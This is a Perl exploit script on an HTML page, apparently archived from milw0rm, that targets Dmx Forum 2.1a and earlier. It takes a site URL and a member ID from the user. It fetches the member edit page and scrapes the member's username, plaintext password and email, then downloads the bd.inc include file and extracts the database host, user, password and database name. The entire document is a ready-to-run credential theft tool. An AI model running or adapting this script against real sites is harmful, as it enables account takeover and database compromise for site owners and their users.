<html><head><title>Dmx Forum <= 2.1a (edit.php) Remote Password Disclosure Exploit</title></head><pre>#!/usr/bin/perl
#
# by DarkFig -- www.acid-root.new.fr
#
use LWP::Simple;

if ( !$ARGV[1] ) {
header();
print &quot;\n| Usage: &lt;url&gt; &lt;member_id&gt; ----------------|&quot;;
print &quot;\n+------------------------------------------+&quot;;
print &quot;\n| Example: http://localhost/dmx/ 1   ------|&quot;;
end();
}

sub header {
print &quot;\n+------------------------------------------+&quot;;
print &quot;\n| Dmx Forum &lt;= v2.1a SQL Injection Exploit |&quot;;
print &quot;\n+------------------------------------------+&quot;;
}

sub end {
print &quot;\n+------------------------------------------+\n&quot;;
exit;
}

$err0 = &quot;\n[-]Can't connect to the host !&quot;;

header();
$url = &quot;$ARGV[0]&quot;.&quot;pops/edit.php?membre=&quot;.&quot;$ARGV[1]&quot;;
$req = get($url) or print &quot;$err0&quot;;

if( $req =~ /input name=&quot;pseudo&quot; type=&quot;text&quot; id=&quot;pseudo&quot; value=&quot;(.*?)&quot;/ ){
print &quot;\n [+]Username: $1&quot;;
$req =~ /input name=&quot;pwd&quot; type=&quot;password&quot; id=&quot;pwd&quot; value=&quot;(.*?)&quot;/ , print &quot;\n [+]Password: $1&quot;;
$req =~ /input name=&quot;email&quot; type=&quot;text&quot; id=&quot;email&quot; value=&quot;(.*?)&quot;/ , print &quot;\n [+]Email: $1&quot;;} else {print &quot;\n[-]Part 1 failed !&quot;;}


$url2 = &quot;$ARGV[0]&quot;.&quot;_includes/bd.inc&quot;;
$req2 = get($url2) or print &quot;$err0&quot;;
if($req2 =~ /host = &quot;(.*?)&quot;;/)
{print &quot;\n[+]DBHOST: $1&quot;;
$req2 =~ /user = &quot;(.*?)&quot;;/;print &quot;\n[+]DBUSER: $1&quot;;
$req2 =~ /pass = &quot;(.*?)&quot;;/;print &quot;\n[+]DBPASS: $1&quot;;
$req2 =~ /bdd = &quot;(.*?)&quot;;/;print &quot;\n[+]DBNAME: $1&quot;;
} else {print &quot;\n[-]Part 2 failed !&quot;;}

end();

# milw0rm.com [2006-06-05]</pre></html>